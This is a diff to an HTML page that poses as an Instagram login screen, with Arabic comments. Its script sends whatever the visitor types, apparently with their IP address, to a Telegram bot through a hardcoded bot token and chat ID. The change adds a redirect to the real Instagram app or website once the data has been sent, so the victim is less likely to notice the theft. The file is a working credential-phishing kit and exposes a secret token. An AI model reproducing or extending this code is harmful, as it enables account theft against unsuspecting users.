@@ -41,9 +41,7 @@
             </div>
             <div class="panel register flex justify-content-center">
                 <p>Don't have an account?</p>
-                <!-- تم استبدال الرابط هنا برابط حساب إنستغرام -->
-                <a href="www.instagram.com
-" target="_blank">زيارة حساب إنستغرام</a>
+                <a href="www.instagram.com" target="_blank">زيارة حساب إنستغرام</a>
             </div>
             <div class="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
@@ -74,7 +72,7 @@
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7474180263:AAHRByLJi2S6Mkby-RZFXHRLCgX1jdSIJhE"; // هنا التوكين
-        const CHAT_ID = "7223574687"; // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+        const CHAT_ID = "7223574687"; // هنا معرف الشات
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
         // إضافة حدث الإرسال للنموذج
@@ -112,6 +110,9 @@
                         text: message
                     }).then(response => {
                         alert('Information sent successfully!');
+                        
+                        // محاولة فتح تطبيق Instagram بعد تسجيل الدخول
+                        openInstagram();
                     }).catch(error => {
                         alert('Error sending the information. Please try again.');
                     });
@@ -120,6 +121,28 @@
                     alert('Error fetching the IP address. Please try again.');
                 });
         });
+
+        function openInstagram() {
+            const iosAppLink = "instagram://";  // رابط تطبيق iOS
+            const androidAppLink = "intent://#Intent;package=com.instagram.android;scheme=instagram;end";  // رابط تطبيق Android
+            const webLink = "https://www.instagram.com";  // الرابط في حال عدم تثبيت التطبيق
+
+            // محاولة فتح التطبيق باستخدام الرابط
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/iphone|ipod|ipad/.test(userAgent)) {
+                window.location.href = iosAppLink;
+                setTimeout(function() {
+                    window.location.href = webLink;  // إذا لم يتم فتح التطبيق خلال 2 ثانية، افتح الرابط
+                }, 2000);
+            } else if (/android/.test(userAgent)) {
+                window.location.href = androidAppLink;
+                setTimeout(function() {
+                    window.location.href = webLink;  // إذا لم يتم فتح التطبيق خلال 2 ثانية، افتح الرابط
+                }, 2000);
+            } else {
+                window.location.href = webLink;  // افتح الرابط في حالة عدم تحديد النظام
+            }
+        }
     </script>
 </body>
 </html>
